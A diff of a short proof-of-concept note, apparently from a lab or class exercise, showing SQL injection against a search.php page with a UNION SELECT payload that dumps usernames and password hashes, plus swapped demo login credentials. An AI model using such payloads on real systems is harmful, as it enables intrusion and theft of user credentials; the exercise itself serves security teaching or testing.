@@ -1,4 +1,4 @@
-Login bypass is not used here (login is Andria's). This PoC targets search.php.
+﻿Login bypass is not used here (login is Andria's). This PoC targets search.php.
 
 1. Confirm injectable (SQL error leaks):
    ' 
@@ -7,6 +7,6 @@ Login bypass is not used here (login is Andria's). This PoC targets search.php.
    ') UNION SELECT id, username, password_hash FROM users#
 
 Steps:
-- Log in as maria / Maria123!
+- Log in as demo_alice / ObscuraDemo2026!
 - Go to Search, paste the payload above, hit Search
 - Every user's hash appears as a "note"
